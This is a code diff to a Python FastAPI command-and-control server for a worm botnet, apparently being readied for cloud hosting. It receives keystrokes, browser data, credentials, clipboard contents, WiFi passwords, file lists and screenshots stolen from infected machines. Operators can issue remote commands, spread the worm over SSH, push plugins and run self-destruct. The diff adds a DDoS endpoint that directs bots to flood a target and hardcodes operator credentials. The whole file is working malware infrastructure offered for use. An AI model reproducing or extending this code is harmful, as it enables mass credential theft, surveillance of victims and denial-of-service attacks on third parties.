@@ -1,4 +1,4 @@
-from fastapi import FastAPI, HTTPException, Depends, status, BackgroundTasks, UploadFile, File
+from fastapi import FastAPI, HTTPException, Depends, status, BackgroundTasks, UploadFile, File, Form
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBasic, HTTPBasicCredentials
 from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
@@ -13,15 +13,33 @@ import shutil
 import json
 import base64
 import hashlib
+import pickle
+import time
+import threading
 from pathlib import Path
 
-app = FastAPI(title="C2 Worm Server", description="Advanced Worm Command & Control")
+# ==================== RENDER CONFIGURATION ====================
+# Environment variables (set in Render dashboard)
+USERNAME = os.getenv("C2_USERNAME", "xotiic")
+PASSWORD = os.getenv("C2_PASSWORD", "40671Mps19*")
+ENVIRONMENT = os.getenv("ENVIRONMENT", "development")
+PORT = int(os.getenv("PORT", 5000))
 
-# Security - Change these immediately!
+# Data directories - Render has persistent disk at /var/data
+DATA_DIR = "/var/data/worm_c2" if ENVIRONMENT == "production" else "./data"
+os.makedirs(DATA_DIR, exist_ok=True)
+os.makedirs(f"{DATA_DIR}/logs", exist_ok=True)
+os.makedirs(f"{DATA_DIR}/plugins", exist_ok=True)
+os.makedirs(f"{DATA_DIR}/screenshots", exist_ok=True)
+os.makedirs(f"{DATA_DIR}/uploads", exist_ok=True)
+os.makedirs(f"{DATA_DIR}/worm_versions", exist_ok=True)
+os.makedirs("templates", exist_ok=True)
 
-USERNAME = os.getenv("C2_USERNAME", DEFAULT_USERNAME)
-PASSWORD = os.getenv("C2_PASSWORD", DEFAULT_PASSWORD)
+app = FastAPI(title="Worm C2 System", 
+              description="Advanced Command & Control for Worm",
+              version="2.0.0")
 
+# Security
 security = HTTPBasic()
 
 def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
@@ -35,9 +53,11 @@ def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
         )
     return credentials.username
 
+# CORS for frontend
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
+    allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
@@ -119,42 +139,96 @@ class PropagationCommand(BaseModel):
     target_ips: Optional[List[str]] = None
     all_bots: bool = True
 
-class PluginUpload(BaseModel):
-    name: str
-    version: str
-    description: Optional[str] = None
+class DDoSCommand(BaseModel):
+    target: str
+    port: int = 80
+    duration: int = 60
+    method: str = "http"
+    bots: Optional[List[str]] = None
+    count: Optional[int] = None
+    all_bots: bool = True
 
-# ==================== File Storage ====================
-os.makedirs("uploads", exist_ok=True)
-os.makedirs("worm_versions", exist_ok=True)
-os.makedirs("plugins", exist_ok=True)
-os.makedirs("logs", exist_ok=True)
-os.makedirs("screenshots", exist_ok=True)
-os.makedirs("data", exist_ok=True)
+# ==================== File Storage with Persistence ====================
+class PersistentStorage:
+    """Handles persistent storage on Render's disk"""
+    
+    @staticmethod
+    def save_json(filename, data):
+        path = f"{DATA_DIR}/{filename}"
+        with open(path, 'w') as f:
+            json.dump(data, f)
+    
+    @staticmethod
+    def load_json(filename, default=None):
+        path = f"{DATA_DIR}/{filename}"
+        if os.path.exists(path):
+            with open(path, 'r') as f:
+                return json.load(f)
+        return default or {}
+    
+    @staticmethod
+    def append_log(filename, entry):
+        path = f"{DATA_DIR}/logs/{filename}"
+        with open(path, 'a') as f:
+            f.write(json.dumps(entry) + '\n')
+    
+    @staticmethod
+    def read_logs(filename, limit=100):
+        path = f"{DATA_DIR}/logs/{filename}"
+        if os.path.exists(path):
+            with open(path, 'r') as f:
+                lines = f.readlines()[-limit:]
+                return [json.loads(line) for line in lines]
+        return []
 
-# ==================== In-Memory Storage ====================
-keystroke_logs: List[Dict] = []
-browser_logs: List[Dict] = []
-credential_logs: List[Dict] = []
-wifi_logs: List[Dict] = []
-file_logs: List[Dict] = []
-screenshot_logs: List[Dict] = []
-bots: Dict[str, dict] = {}
+# ==================== In-Memory Storage (with persistence) ====================
+# Load from disk on startup
+bots = PersistentStorage.load_json('bots.json', {})
+plugins = PersistentStorage.load_json('plugins.json', {})
+keystroke_logs = []  # Recent logs in memory
+browser_logs = []
+credential_logs = []
+wifi_logs = []
+file_logs = []
+screenshot_logs = []
 commands: Dict[str, List[dict]] = {}
 terminal_outputs: Dict[str, List[str]] = {}
-plugins: Dict[str, dict] = {}
 
-# Load plugins from disk
-if os.path.exists("plugins/plugins.json"):
-    with open("plugins/plugins.json", "r") as f:
-        plugins = json.load(f)
+# ==================== Background Tasks ====================
+def save_data_periodically():
+    """Save data to disk every minute"""
+    while True:
+        time.sleep(60)
+        try:
+            PersistentStorage.save_json('bots.json', bots)
+            PersistentStorage.save_json('plugins.json', plugins)
+        except:
+            pass
+
+# Start background thread
+if ENVIRONMENT == "production":
+    thread = threading.Thread(target=save_data_periodically, daemon=True)
+    thread.start()
 
 # ==================== API Endpoints ====================
 
 @app.get("/", response_class=HTMLResponse)
 async def get_dashboard():
-    with open("templates/index.html", "r") as f:
-        return f.read()
+    try:
+        with open("templates/index.html", "r") as f:
+            return HTMLResponse(content=f.read())
+    except:
+        return HTMLResponse(content="<h1>Worm C2 Server</h1><p>Dashboard template not found</p>")
+
+@app.get("/api/health")
+async def health_check():
+    """Health check endpoint for Render"""
+    return {
+        "status": "healthy",
+        "timestamp": datetime.datetime.utcnow().isoformat(),
+        "bots": len(bots),
+        "environment": ENVIRONMENT
+    }
 
 @app.get("/api/login-test")
 async def login_test(username: str = Depends(authenticate)):
@@ -169,11 +243,7 @@ async def report_keystrokes(report: KeystrokeReport):
     keystroke_logs.append(log_entry)
     
     # Save to file
-    try:
-        with open(f"logs/keystrokes_{report.ip.replace('.', '_')}.log", "a") as f:
-            f.write(json.dumps(log_entry) + "\n")
-    except:
-        pass
+    PersistentStorage.append_log(f"keystrokes_{report.ip.replace('.', '_')}.log", log_entry)
     
     # Update bot info
     bots[report.ip] = {
@@ -185,43 +255,33 @@ async def report_keystrokes(report: KeystrokeReport):
         "first_seen": bots.get(report.ip, {}).get("first_seen", datetime.datetime.utcnow().isoformat())
     }
     
+    # Keep logs manageable
+    if len(keystroke_logs) > 10000:
+        keystroke_logs.pop(0)
+    
     return {"status": "ok"}
 
 @app.post("/api/browser")
 async def report_browser_data(data: BrowserData):
     """Receive browser data from worm."""
-    browser_logs.append(data.dict())
-    
-    # Save to file
-    try:
-        with open(f"logs/browser_{data.ip.replace('.', '_')}.json", "a") as f:
-            f.write(json.dumps(data.dict()) + "\n")
-    except:
-        pass
-    
+    entry = data.dict()
+    browser_logs.append(entry)
+    PersistentStorage.append_log(f"browser_{data.ip.replace('.', '_')}.log", entry)
     return {"status": "ok"}
 
 @app.post("/api/credentials")
 async def report_credentials(creds: CredentialReport):
     """Receive detected credentials."""
-    credential_logs.append(creds.dict())
-    
-    # Save to file
-    try:
-        with open(f"logs/credentials_{creds.ip.replace('.', '_')}.json", "a") as f:
-            f.write(json.dumps(creds.dict()) + "\n")
-    except:
-        pass
-    
+    entry = creds.dict()
+    credential_logs.append(entry)
+    PersistentStorage.append_log(f"credentials_{creds.ip.replace('.', '_')}.log", entry)
     return {"status": "ok"}
 
 @app.post("/api/clipboard")
 async def report_clipboard(clip: ClipboardReport):
     """Receive clipboard data."""
-    # Store in memory (limit to last 100)
-    if len(keystroke_logs) > 10000:
-        keystroke_logs.pop(0)
-    
+    # Just log to file
+    PersistentStorage.append_log(f"clipboard_{clip.ip.replace('.', '_')}.log", clip.dict())
     return {"status": "ok"}
 
 @app.post("/api/screenshot")
@@ -236,9 +296,11 @@ async def receive_screenshot(
 ):
     """Receive screenshot from worm."""
     # Save screenshot
-    filename = f"screenshots/{ip.replace('.', '_')}_{timestamp.replace(':', '-')}.png"
+    filename = f"{ip.replace('.', '_')}_{timestamp.replace(':', '-')}.png"
+    filepath = f"{DATA_DIR}/screenshots/{filename}"
+    
     content = await screenshot.read()
-    with open(filename, "wb") as f:
+    with open(filepath, "wb") as f:
         f.write(content)
     
     screenshot_logs.append({
@@ -256,21 +318,17 @@ async def receive_screenshot(
 @app.post("/api/wifi")
 async def report_wifi(wifi: WiFiReport):
     """Receive WiFi credentials."""
-    wifi_logs.append(wifi.dict())
-    
-    # Save to file
-    try:
-        with open(f"logs/wifi_{wifi.ip.replace('.', '_')}.json", "a") as f:
-            f.write(json.dumps(wifi.dict()) + "\n")
-    except:
-        pass
-    
+    entry = wifi.dict()
+    wifi_logs.append(entry)
+    PersistentStorage.append_log(f"wifi_{wifi.ip.replace('.', '_')}.log", entry)
     return {"status": "ok"}
 
 @app.post("/api/files")
 async def report_files(files: FileListReport):
     """Receive list of interesting files."""
-    file_logs.append(files.dict())
+    entry = files.dict()
+    file_logs.append(entry)
+    PersistentStorage.append_log(f"files_{files.ip.replace('.', '_')}.log", entry)
     return {"status": "ok"}
 
 @app.post("/api/heartbeat")
@@ -361,6 +419,44 @@ async def broadcast_command(cmd: TerminalCommand, username: str = Depends(authen
         "command_id": cmd_id
     }
 
+@app.post("/api/ddos")
+async def ddos_attack(ddos: DDoSCommand, username: str = Depends(authenticate)):
+    """Launch DDoS attack."""
+    cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
+    cmd_str = f"ddos:{ddos.target}:{ddos.port}:{ddos.duration}:{ddos.method}"
+    
+    # Get active bots
+    now = datetime.datetime.utcnow()
+    active_bots = []
+    for ip, info in bots.items():
+        last = datetime.datetime.fromisoformat(info["last_seen"])
+        if (now - last).seconds < 300:
+            active_bots.append(ip)
+    
+    target_bots = active_bots if ddos.all_bots else [ip for ip in ddos.bots if ip in active_bots]
+    
+    if ddos.count and ddos.count < len(target_bots):
+        target_bots = random.sample(target_bots, ddos.count)
+    
+    cmd_data = {
+        "id": cmd_id,
+        "command": cmd_str,
+        "is_terminal": False,
+        "timestamp": datetime.datetime.utcnow().isoformat(),
+        "issued_by": username
+    }
+    
+    for ip in target_bots:
+        if ip not in commands:
+            commands[ip] = []
+        commands[ip].append(cmd_data)
+    
+    return {
+        "status": "attack launched",
+        "bots_used": len(target_bots),
+        "total_active": len(active_bots)
+    }
+
 @app.post("/api/propagate")
 async def propagate_worm(prop: PropagationCommand, username: str = Depends(authenticate)):
     """Command worms to spread via SSH."""
@@ -406,16 +502,16 @@ async def propagate_worm(prop: PropagationCommand, username: str = Depends(authe
 @app.post("/api/upload_plugin")
 async def upload_plugin(
     file: UploadFile = File(...),
-    name: str = "custom_plugin",
-    version: str = "1.0.0",
-    description: str = "",
-    target_ips: Optional[str] = None,
-    all_bots: bool = True,
+    name: str = Form("custom_plugin"),
+    version: str = Form("1.0.0"),
+    description: str = Form(""),
+    target_ips: Optional[str] = Form(None),
+    all_bots: bool = Form(True),
     username: str = Depends(authenticate)
 ):
     """Upload plugin to run on bots."""
     plugin_filename = f"{name}_v{version}.py"
-    plugin_path = f"plugins/{plugin_filename}"
+    plugin_path = f"{DATA_DIR}/plugins/{plugin_filename}"
     
     content = await file.read()
     with open(plugin_path, "wb") as f:
@@ -429,8 +525,7 @@ async def upload_plugin(
         "uploaded_by": username
     }
     
-    with open("plugins/plugins.json", "w") as f:
-        json.dump(plugins, f)
+    PersistentStorage.save_json('plugins.json', plugins)
     
     cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
     plugin_url = f"/plugins/{plugin_filename}"
@@ -472,10 +567,29 @@ async def upload_plugin(
 
 @app.get("/plugins/{filename}")
 async def get_plugin(filename: str):
-    file_path = f"plugins/{filename}"
+    """Serve plugin files to bots."""
+    file_path = f"{DATA_DIR}/plugins/{filename}"
     if os.path.exists(file_path):
         return FileResponse(file_path)
     return {"error": "Plugin not found"}
+
+@app.post("/api/bot/self_destruct")
+async def self_destruct(ip: str, username: str = Depends(authenticate)):
+    """Send self-destruct command to a bot."""
+    cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
+    cmd_data = {
+        "id": cmd_id,
+        "command": "self_destruct",
+        "is_terminal": False,
+        "timestamp": datetime.datetime.utcnow().isoformat(),
+        "issued_by": username
+    }
+    
+    if ip not in commands:
+        commands[ip] = []
+    commands[ip].append(cmd_data)
+    
+    return {"status": f"Self-destruct signal sent to {ip}"}
 
 # ==================== Dashboard Data Endpoints ====================
 
@@ -499,7 +613,10 @@ async def get_bots(username: str = Depends(authenticate)):
 
 @app.get("/api/keystrokes")
 async def get_keystrokes(limit: int = 100, ip_filter: Optional[str] = None, username: str = Depends(authenticate)):
-    filtered = keystroke_logs if not ip_filter else [log for log in keystroke_logs if log["ip"] == ip_filter]
+    if ip_filter:
+        filtered = [log for log in keystroke_logs if log["ip"] == ip_filter]
+    else:
+        filtered = keystroke_logs
     return filtered[-limit:][::-1]
 
 @app.get("/api/browser_data")
@@ -524,7 +641,7 @@ async def get_screenshots(limit: int = 20, username: str = Depends(authenticate)
 
 @app.get("/api/screenshot/{filename}")
 async def get_screenshot(filename: str, username: str = Depends(authenticate)):
-    file_path = f"screenshots/{filename}"
+    file_path = f"{DATA_DIR}/screenshots/{filename}"
     if os.path.exists(file_path):
         return FileResponse(file_path)
     return {"error": "Not found"}
@@ -553,11 +670,13 @@ async def get_stats(username: str = Depends(authenticate)):
         "total_credentials": len(credential_logs),
         "total_wifi": len(wifi_logs),
         "total_files": len(file_logs),
-        "total_screenshots": len(screenshot_logs)
+        "total_screenshots": len(screenshot_logs),
+        "uptime": time.time(),
+        "environment": ENVIRONMENT
     }
 
 @app.get("/api/credentials")
-async def get_credentials(username: str = Depends(authenticate)):
+async def get_creds(username: str = Depends(authenticate)):
     return {"username": USERNAME, "password": PASSWORD}
 
 @app.post("/api/change_credentials")
@@ -571,16 +690,15 @@ async def change_credentials(
     PASSWORD = new_password
     return {"status": "credentials updated"}
 
-if __name__ == "__main__":
-    import uvicorn
-    os.makedirs("templates", exist_ok=True)
-    
+# ==================== Startup Banner ====================
+@app.on_event("startup")
+async def startup_event():
     print("\n" + "="*60)
-    print("🚀 ADVANCED C2 WORM SERVER STARTED")
+    print("🚀 WORM C2 SERVER STARTED ON RENDER")
     print("="*60)
-    print(f"📍 Login URL: http://localhost:5000")
+    print(f"📍 Environment: {ENVIRONMENT}")
+    print(f"📍 Data Directory: {DATA_DIR}")
     print(f"🔑 Username: {USERNAME}")
     print(f"🔑 Password: {PASSWORD}")
+    print(f"📊 Total Bots: {len(bots)}")
     print("="*60 + "\n")
-    
-    uvicorn.run(app, host="0.0.0.0", port=5000)
